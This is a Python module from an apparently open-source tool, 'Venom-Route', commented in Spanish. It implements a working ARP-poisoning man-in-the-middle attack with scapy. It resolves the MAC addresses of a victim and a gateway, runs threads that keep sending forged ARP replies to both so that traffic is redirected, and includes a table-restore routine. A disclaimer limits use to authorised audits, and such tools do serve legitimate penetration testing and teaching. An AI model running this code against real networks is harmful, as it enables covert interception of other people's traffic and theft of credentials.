# Copyright (C) 2026 SysMho
#
# Este archivo es parte de Venom-Route.
# Venom-Route es software libre: puedes redistribuirlo y/o modificarlo bajo
# los términos de la GNU General Public License v3 (o, a tu elección, una
# versión posterior) publicada por la Free Software Foundation.
# Se distribuye SIN NINGUNA GARANTÍA. Consulta la GNU GPL para más
# detalles: <https://www.gnu.org/licenses/gpl-3.0.html>
# =============================================================================
# Autor        : (SysMho)
# Módulo       : arp_utils.py
# Descripción  : Control sobre tablas ARP para ataques tipo MITM.
#
# Funcionalidad:
#   - Envenenamiento ARP bidireccional
#   - Restauración de tablas ARP originales
#   - Hilos para mantener ataque activo
#
# Nota legal     : Esta herramienta está diseñada para pruebas
#                  controladas, fines educativos o auditorías
#                  con consentimiento explícito.
# =============================================================================

import time
import threading
from scapy.all import ARP, Ether, send, sendp, srp
import network_utils
import ui_utils
import venom_logger

log = venom_logger.get_logger()

# Control global de hilos y señal de parada
arpspoof_processes = []
stop_attack = threading.Event()


# Resuelve la dirección MAC de la IP destino mediante ARP.

def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, retry=2,
        iface=network_utils.interface,
        verbose=0
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


# Restaura las tablas ARP reales entre víctima y gateway.

def restore_arp():
    print("[*] Restaurando tablas ARP...")
    victim_mac = get_mac(network_utils.ip_victima)
    gateway_mac = get_mac(network_utils.ip_gateway)

    if not victim_mac or not gateway_mac:
        log.error(
            "No se pudieron resolver las MAC reales antes de "
            "restaurar (victima=%s gateway=%s).",
            network_utils.ip_victima, network_utils.ip_gateway,
        )
        msg = "[✘] No se pudieron resolver las MAC reales"
        print(ui_utils.BOLD_RED + msg + ui_utils.NC)
        return

    for i in range(10):
        msg = f"[→] Intento {i+1} de restaurar ARP..."
        print(f"{ui_utils.GREY}{msg}{ui_utils.NC}")
        arp_pkt = ARP(
            op=2, pdst=network_utils.ip_victima,
            psrc=network_utils.ip_gateway, hwsrc=gateway_mac
        )
        send(arp_pkt, iface=network_utils.interface, verbose=0)
        arp_pkt = ARP(
            op=2, pdst=network_utils.ip_gateway,
            psrc=network_utils.ip_victima, hwsrc=victim_mac
        )
        send(arp_pkt, iface=network_utils.interface, verbose=0)
        time.sleep(0.3)

    msg = "[✔] Tablas ARP restauradas (o al menos intentado)."
    print(ui_utils.BOLD_GREEN + msg + ui_utils.NC)
    log.info("Tablas ARP restauradas (victima y gateway).")


# Hilo que envía paquetes ARP falsificados continuamente.

def arpspoof_thread(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        log.error("No se pudo resolver la MAC de %s.", target_ip)
        msg = f"[✘] No se pudo resolver la MAC de {target_ip}."
        print(ui_utils.BOLD_RED + msg + ui_utils.NC)
        return

    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=spoof_ip)

    while not stop_attack.is_set():
        sendp(pkt, iface=network_utils.interface, verbose=0)
        time.sleep(2)


# Inicia el envenenamiento de la víctima.

def spoof_objetivo():
    print("[*] Preparando envenenamiento ARP al objetivo.")
    ui_utils.loading_bar(
        "Posicionando sobre la víctima", "Objetivo localizado"
    )
    thread = threading.Thread(
        target=arpspoof_thread,
        args=(network_utils.ip_victima, network_utils.ip_gateway),
        daemon=True,
    )
    thread.start()
    arpspoof_processes.append(thread)
    log.info("Envenenamiento ARP iniciado contra la víctima.")
    msg = "[✓] Tabla ARP del objetivo manipulada.\n"
    print(ui_utils.BOLD_GREEN + msg + ui_utils.NC)


# Inicia el envenenamiento de la gateway.

def spoof_gateway():
    print("[*] Preparando envenenamiento ARP para la Gateway.")
    ui_utils.loading_bar("Accediendo al enlace Gateway", "Router identificado")
    thread = threading.Thread(
        target=arpspoof_thread,
        args=(network_utils.ip_gateway, network_utils.ip_victima),
        daemon=True,
    )
    thread.start()
    arpspoof_processes.append(thread)
    log.info("Envenenamiento ARP iniciado contra la gateway.")
    msg = "[✓] Tabla ARP de la gateway manipulada.\n"
    print(ui_utils.BOLD_GREEN + msg + ui_utils.NC)
